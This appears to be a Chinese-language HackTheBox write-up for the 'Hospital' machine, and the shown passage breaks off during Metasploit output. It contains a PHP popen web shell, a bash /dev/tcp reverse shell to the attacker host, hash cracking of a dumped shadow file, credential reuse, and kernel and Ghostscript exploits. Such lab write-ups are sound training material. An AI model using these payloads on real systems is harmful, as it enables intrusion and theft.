{"pageProps":{"postData":{"id":"HackTheBoxMachine - Hospital","contentHtml":"<h1>Machine - Hospital</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Hospital\">https://app.hackthebox.com/machines/Hospital</a> | <code>Windows</code> | <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>使用<code>nmap</code>进行扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital nmap -sT -min-rate 5000 10.10.11.241\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 21:19 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.241\nHost is up (0.054s latency).\nNot shown: 979 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1801/tcp open  msmq\n2103/tcp open  zephyr-clt\n2105/tcp open  eklogin\n2107/tcp open  msmq-mgmt\n2179/tcp open  vmrdp\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman\n8080/tcp open  http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.75 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Hospital nmap -sT -A -p 22,53,88,135,139,389,636,445,443,8080,2105 10.10.11.241\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)\n|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-06-03 19:59:02Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n443/tcp  open  ssl/http      Apache httpd 2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n| tls-alpn:\n|_  http/1.1\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n|_http-title: Hospital Webmail :: Welcome to Hospital Webmail\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n445/tcp  open  microsoft-ds?\nPORT    STATE SERVICE  VERSION\n389/tcp open  ldap     Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n636/tcp open  ldapssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n2105/tcp open  msrpc         Microsoft Windows RPC\n8080/tcp open  http          Apache httpd 2.4.55 ((Ubuntu))\n|_http-server-header: Apache/2.4.55 (Ubuntu)\n| http-title: Login\n|_Requested resource was login.php\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not <span class=\"hljs-built_in\">set</span>\n|_http-open-proxy: Proxy might be redirecting requests\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%)\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3\nAggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 4.15 (85%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-06-03T19:59:59\n|_  start_date: N/A\n|_clock-skew: 6h38m32s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   87.53 ms 10.10.16.1\n2   87.92 ms 10.10.11.241\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 103.35 seconds\n</code></pre>\n<p>看结果是有两个<code>Web</code>服务</p>\n<p>匿名账户 <code>SMB</code> 无果</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital smbclient -L 10.10.11.241 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>现在要决定哪个先作为目标，443端口是 <code>RoundCube</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image1.png\" alt=\"image.png\"></p>\n<p><code>8080</code> 端口像是自己写的一个医疗系统</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image2.png\" alt=\"image.png\"></p>\n<p>但是可以注册账户</p>\n<p>注册后登录进去，有一个文件上传功能点</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image3.png\" alt=\"image.png\"></p>\n<h3>文件上传测试</h3>\n<p>对上传功能点进行<code>Fuzz</code></p>\n<p>通过修改后缀名成功上传 <code>phar</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image4.png\" alt=\"image.png\"></p>\n<p>通过目录扫描扫描一下是否找到上传后的文件夹</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital dirsearch -u http://10.10.11.241:8080/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Hospital/reports/http_10.10.11.241_8080/__25-06-03_21-40-13.txt\n\nTarget: http://10.10.11.241:8080/\n\n[21:40:13] Starting: \n[21:40:36] 200 -    0B  - /config.php\n[21:40:37] 301 -  317B  - /css  ->  http://10.10.11.241:8080/css/\n[21:40:42] 301 -  319B  - /fonts  ->  http://10.10.11.241:8080/fonts/\n[21:40:44] 301 -  320B  - /images  ->  http://10.10.11.241:8080/images/\n[21:40:46] 301 -  316B  - /js  ->  http://10.10.11.241:8080/js/\n[21:40:48] 200 -    2KB - /login.php\n[21:40:58] 200 -    2KB - /register.php\n[21:41:07] 200 -    0B  - /upload.php\n[21:41:08] 301 -  321B  - /uploads  ->  http://10.10.11.241:8080/uploads/\n\nTask Completed\n</code></pre>\n<p>尝试访问上传的文件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image5.png\" alt=\"image.png\"></p>\n<p>成功！！我们接着换成一句话木马 hah</p>\n<p>上传后发现无法执行，原来是被禁用了，他们将很多的命令执行的函数都<code>ban</code>掉了</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image6.png\" alt=\"image.png\"></p>\n<p>但是发现一些伪协议没有被<code>ban</code>掉</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image7.png\" alt=\"image.png\"></p>\n<p>尝试进行文件读取</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php include(<span class=\"hljs-string\">'php://filter/convert.base64-encode/resource=c:/WINDOWS/system.ini'</span>);?>\n</code></pre>\n<p>结果也是一样读取不到</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image8.png\" alt=\"image.png\"></p>\n<p>尝试爆破一下未被禁用的命令执行函数</p>\n<pre><code class=\"hljs language-bash\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,<span class=\"hljs-built_in\">exec</span>,proc_open,preg_replace,passthru,curl_exec\n</code></pre>\n<p>我们发现<code>popen</code>并没有被禁用，我们上传 <code>popen</code>的一句话木马</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n<span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">'win_cmd'</span>])) {\n    <span class=\"hljs-variable\">$command_to_execute</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">'win_cmd'</span>];\n    <span class=\"hljs-variable\">$handle</span> = popen(<span class=\"hljs-variable\">$command_to_execute</span> . <span class=\"hljs-string\">' 2>&#x26;1'</span>, <span class=\"hljs-string\">'r'</span>);\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$handle</span>) {\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;pre>\"</span>;\n        <span class=\"hljs-keyword\">while</span> ((<span class=\"hljs-variable\">$line</span> = fgets(<span class=\"hljs-variable\">$handle</span>)) !== <span class=\"hljs-literal\">false</span>) {\n            <span class=\"hljs-built_in\">echo</span> htmlspecialchars(<span class=\"hljs-variable\">$line</span>);\n        }\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;/pre>\"</span>;\n        <span class=\"hljs-variable\">$exit_status</span> = pclose(<span class=\"hljs-variable\">$handle</span>);\n    } <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"无法执行命令或打开管道。\"</span>;\n    }\n} <span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"请提供 'win_cmd' 参数来执行命令。\"</span>;\n}\n?>\n</code></pre>\n<p>成功执行命令</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image9.png\" alt=\"image.png\"></p>\n<h3>反弹 shell</h3>\n<p>这里我看靶机信息是<code>Windows</code>，然后尝试了很多的<code>Windows</code>反弹<code>shell</code>的命令，直到我发现回显<code>powershell</code>不存在，然后我读取了一下 <code>/etc/passwd</code></p>\n<p>所以这里应该是一个容器</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image10.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/NOOOO-3x.gif\" alt=\"NOOOO-3x.gif\"></p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/10.10.16.69/1234 0>&#x26;1'</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image11.png\" alt=\"image.png\"></p>\n<h2>In Www-data Shell</h2>\n<h3>Basic info</h3>\n<pre><code class=\"hljs language-bash\">www-data@webserver:/var$ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::215:5dff:fe00:8a02/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@webserver:/var$ <span class=\"hljs-built_in\">ls</span> /home\ndrwilliams\n</code></pre>\n<h3>Mysql Dump</h3>\n<p>拿到 <code>shell</code> 后得到了数据的账号密码，取一下有用的数据</p>\n<pre><code class=\"hljs language-bash\">www-data@webserver:/var/www/html$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n/* Database credentials. Assuming you are running MySQL\nserver with default setting (user <span class=\"hljs-string\">'root'</span> with no password) */\ndefine(<span class=\"hljs-string\">'DB_SERVER'</span>, <span class=\"hljs-string\">'localhost'</span>);\ndefine(<span class=\"hljs-string\">'DB_USERNAME'</span>, <span class=\"hljs-string\">'root'</span>);\ndefine(<span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'my$qls3rv1c3!'</span>);\ndefine(<span class=\"hljs-string\">'DB_NAME'</span>, <span class=\"hljs-string\">'hospital'</span>);\n \n/* Attempt to connect to MySQL database */\n<span class=\"hljs-variable\">$link</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n \n// Check connection\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$link</span> === <span class=\"hljs-literal\">false</span>){\n    die(<span class=\"hljs-string\">\"ERROR: Could not connect. \"</span> . mysqli_connect_error());\n}\n?>\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@webserver:/var/www/html$ mysql -uroot -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection <span class=\"hljs-built_in\">id</span> is 35\nServer version: 10.11.2-MariaDB-1 Ubuntu 23.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nMariaDB [(none)]> \nMariaDB [hospital]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+----+------------+--------------------------------------------------------------+---------------------+\n| <span class=\"hljs-built_in\">id</span> | username   | password                                                     | created_at          |\n+----+------------+--------------------------------------------------------------+---------------------+\n|  1 | admin      | $2y$10<span class=\"hljs-variable\">$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG</span>.3NLrxcjMh2 | 2023-09-21 14:46:04 |\n|  2 | patient    | $2y$10<span class=\"hljs-variable\">$a</span>.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |\n|  3 | miraimirai | $2y$10<span class=\"hljs-variable\">$Kt41f</span>.pRDSZsxb025P13x.St.0OeWUpcB5PUB/CYllflBTm1soFGq | 2025-06-03 15:30:08 |\n|  4 | sunset     | $2y$10<span class=\"hljs-variable\">$iR4kNSugeGjGRE8M12Yjp</span>.EtnF5AZINPTgtdve7VBPdFVqlbJ262e | 2025-06-03 20:11:12 |\n+----+------------+--------------------------------------------------------------+---------------------+\n4 rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<p>尝试爆破密码</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital <span class=\"hljs-built_in\">cat</span> <span class=\"hljs-built_in\">hash</span> \n1:$2y$10<span class=\"hljs-variable\">$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG</span>.3NLrxcjMh2\n2:$2y$10<span class=\"hljs-variable\">$a</span>.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO\n3:$2y$10<span class=\"hljs-variable\">$Kt41f</span>.pRDSZsxb025P13x.St.0OeWUpcB5PUB/CYllflBTm1soFGq\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Hospital john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n123456           (1) \n</code></pre>\n<h3><strong>GameOver(lay)</strong></h3>\n<p>但是这个密码貌似没什么用，<code>Linpeas</code> 走一波，貌似也没有找到可利用的</p>\n<p>找一下内核漏洞</p>\n<pre><code class=\"hljs language-bash\">www-data@webserver:/tmp$ <span class=\"hljs-built_in\">uname</span> -a\nLinux webserver 5.19.0-35-generic <span class=\"hljs-comment\">#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image12.png\" alt=\"image.png\"></p>\n<blockquote>\n<p><a href=\"https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a></p>\n</blockquote>\n<p>将 <code>payload</code> 上传，运行即可获得 <code>root shell</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image13.png\" alt=\"image.png\"></p>\n<h3>Crack shadow</h3>\n<p><code>fscan</code> 扫一波</p>\n<pre><code class=\"hljs language-bash\">root@webserver:/root# ./fscan -h 192.168.5.1-255\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 192.168.5.2     is alive\n(icmp) Target 192.168.5.1     is alive\n[*] Icmp alive hosts len is: 2\n192.168.5.1:88 open\n192.168.5.1:445 open\n192.168.5.1:443 open\n192.168.5.1:139 open\n192.168.5.1:135 open\n192.168.5.2:80 open\n192.168.5.2:22 open\n[*] alive ports len is: 7\nstart vulscan\n[*] WebTitle http://192.168.5.2        code:302 len:0      title:None 跳转url: http://192.168.5.2/login.php\n[*] WebTitle http://192.168.5.2/login.php code:200 len:5739   title:Login\n[*] NetInfo\n[*]192.168.5.1\n   [->]DC\n   [->]192.168.5.1\n   [->]10.10.11.241\n   [->]dead:beef::236d:2f90:c45e:cc24\n[*] NetBios 192.168.5.1     [+] DC:HOSPITAL\\DC\n[*] WebTitle https://192.168.5.1       code:200 len:5379   title:Hospital Webmail :: 欢迎使用 Hospital Webmail\n</span></code></pre>\n<p>乍一看拿到 <code>root</code> 好像没什么用，我们将 <code>shadow</code> 文件取出来爆破试试</p>\n<pre><code class=\"hljs language-bash\">root:$y$j9T<span class=\"hljs-variable\">$s</span>/Aqv48x449udndpLC6eC.<span class=\"hljs-variable\">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::\ndrwilliams:$6$uWBSeTcoXXTBRkiL<span class=\"hljs-variable\">$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::\n</code></pre>\n<p>最后得到用户<code>drwilliams</code>的密码</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nqwe123!@#        (drwilliams)\n1g 0:00:01:00 DONE (2025-06-03 23:31) 0.01656g/s 3562p/s 3562c/s 3562C/s raycharles..pakimo\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed.\n</code></pre>\n<h2>In drwilliams Shell</h2>\n<h3>信息收集</h3>\n<p>我们将密码拿去 <code>Fuzz</code> ，测试是否在 <code>Windows</code> 上有效</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital nxc smb 10.10.11.241 -u drwilliams -p <span class=\"hljs-string\">'qwe123!@#'</span> -d hospital.htb\nSMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.241    445    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Hospital nxc wmi 10.10.11.241 -u drwilliams -p <span class=\"hljs-string\">'qwe123!@#'</span> -d hospital.htb \nRPC         10.10.11.241    135    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)\nRPC         10.10.11.241    135    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n</code></pre>\n<p>有效且拥有远程的权限</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital nxc wmi 10.10.11.241 -u drwilliams -p <span class=\"hljs-string\">'qwe123!@#'</span> -d hospital.htb \nRPC         10.10.11.241    135    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)\nRPC         10.10.11.241    135    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n</code></pre>\n<p>但是这里并不能进行远程登录</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital wmiexec.py hospital.htb/drwilliams:<span class=\"hljs-string\">'qwe123!@#'</span>@10.10.11.241 -dc-ip 10.10.11.241\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[-] rpc_s_access_denied\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Hospital evil-winrm -i 10.10.11.241 -u <span class=\"hljs-string\">'drwilliams'</span> -p <span class=\"hljs-string\">'qwe123!@#'</span>\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError\n                                        \nError: Exiting with code 1\n</span></code></pre>\n<p>后来发现 <code>drwilliams</code> 的凭据适用于 <code>RoundCube</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image14.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image15.png\" alt=\"image.png\"></p>\n<p>里面有一封 <code>drbrown</code> 发来的邮件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image16.png\" alt=\"image.png\"></p>\n<p>大致就是使用<code>.eps</code>的文件格式可以使用<code>GhostScript</code>进行可视化</p>\n<p>可能<code>drbrown</code> 会打开我们上传的<code>eps</code>文件，通过检索发现<code>GhostScript</code> 有远程命令执行漏洞</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image17.png\" alt=\"image.png\"></p>\n<h3><strong>CVE-2023-36664</strong></h3>\n<blockquote>\n<p><a href=\"https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a></p>\n</blockquote>\n<p>打开 PS 或 EPS 文件时可能会发生此漏洞，并可能允许因 Ghostscript 错误处理管道设备的权限验证而导致的代码执行。</p>\n<p>制作 <code>payload</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image18.png\" alt=\"image.png\"></p>\n<p>上传 <code>eps</code> 文件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image19.png\" alt=\"image.png\"></p>\n<p>试了好几次才把 <code>Shell</code> 弹过来</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image20.png\" alt=\"image.png\"></p>\n<h2>In Drbrown Shell</h2>\n<p>当前用户能拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">PS C:\\Users\\drbrown.HOSPITAL\\Documents> <span class=\"hljs-built_in\">type</span> ../Desktop/user.txt\n79ba545a7e91123a742e472d792b9d41\n</code></pre>\n<p>查看当前目录下的 <code>ghostscript.bat</code> 能得到<code>drbrown</code>用户密码</p>\n<pre><code class=\"hljs language-bash\">PS C:\\Users\\drbrown.HOSPITAL\\Documents> <span class=\"hljs-built_in\">type</span> ghostscript.bat\n@<span class=\"hljs-built_in\">echo</span> off\n<span class=\"hljs-built_in\">set</span> filename=%~1\npowershell -<span class=\"hljs-built_in\">command</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$p</span> = convertto-securestring 'chr!<span class=\"hljs-variable\">$br0wn</span>' -asplain -force;<span class=\"hljs-variable\">$c</span> = new-object system.management.automation.pscredential('hospital\\drbrown', <span class=\"hljs-variable\">$p</span>);Invoke-Command -ComputerName dc -Credential <span class=\"hljs-variable\">$c</span> -ScriptBlock { cmd.exe /c \"</span>C:\\Program` Files\\gs\\gs10.01.1\\bin\\gswin64c.exe<span class=\"hljs-string\">\" -dNOSAFER \"</span>C:\\Users\\drbrown.HOSPITAL\\Downloads\\%filename%<span class=\"hljs-string\">\" }\"</span>\n</code></pre>\n<p>测试密码准确性</p>\n<pre><code class=\"hljs language-bash\">➜  CVE-2023-36664-Ghostscript-command-injection nxc smb 10.10.11.241 -u drbrown -p <span class=\"hljs-string\">'chr!$br0wn'</span> -d hospital.htb\nSMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.241    445    DC               [+] hospital.htb\\drbrown:chr!<span class=\"hljs-variable\">$br0wn</span> \n</code></pre>\n<p>这里可以使用 <code>evil-winrm</code>来进行连接</p>\n<pre><code class=\"hljs language-bash\">➜  Hospital evil-winrm -i 10.10.11.241 -u <span class=\"hljs-string\">'drbrown'</span> -p <span class=\"hljs-string\">'chr!$br0wn'</span>  \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\drbrown.HOSPITAL\\Documents>\n</span></code></pre>\n<h3>提权-方案-1</h3>\n<p>这里是越级打击，靶机是 <code>2023</code>发布的，这里使用的是 <code>2024</code>的漏洞</p>\n<pre><code class=\"hljs language-bash\">msf6 post(multi/recon/local_exploit_suggester) > exploit                                                                                                                                                        \n[*] 10.10.11.241 - Collecting <span class=\"hljs-built_in\">local</span> exploits <span class=\"hljs-keyword\">for</span> x64/windows...                                                                                                                                                 \n/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer \nbe part of the default gems starting from Ruby 3.4.0.                                                                                                                                                           \nYou can add syslog to your Gemfile or gemspec to silence this warning.                                                                                                                                          \nAlso please contact the author of logging-2.4.0 to request adding syslog into its gemspec.                                                                                                                      \n[*] 10.10.11.241 - 205 exploit checks are being tried...                                                                                                                                                        \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.                                                                                                              \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.                                                                   \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.                                                                                                                  \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.                                                                                                             \n[+] 10.10.11.241 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.                  \n[+] 